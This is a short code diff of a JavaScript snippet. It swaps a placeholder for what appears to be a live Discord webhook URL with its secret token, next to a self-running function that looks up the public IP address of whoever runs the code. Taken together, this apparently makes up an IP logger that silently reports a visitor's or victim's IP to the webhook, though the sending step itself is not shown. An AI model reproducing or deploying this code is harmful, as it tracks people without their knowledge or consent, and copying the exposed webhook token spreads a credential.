@@ -1,5 +1,5 @@
 (async function() {
-    const webhookURL = "YOUR_WEBHOOK_URL";
+    const webhookURL = "https://discord.com/api/webhooks/1355136372499026072/b7g7-A0oYTlos_WEcEgKibVu0TesuSGF2pCAi-s7gTzDl8MEufDIoOvYNQnd4qBUpjQ2";
     async function getIP() {
         try {
             const response = await fetch("https://api64.ipify.org?format=json");
